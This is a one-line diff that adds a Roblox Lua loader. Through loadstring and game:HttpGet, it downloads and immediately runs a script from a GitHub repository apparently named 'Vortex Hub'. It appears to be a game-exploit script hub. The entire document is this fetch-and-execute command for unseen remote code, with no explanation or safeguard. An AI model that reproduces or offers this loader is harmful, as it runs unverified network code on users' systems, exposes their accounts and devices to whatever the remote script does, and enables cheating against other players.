@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Vortex3775/Vortex-Hub/main/Xenon'))()
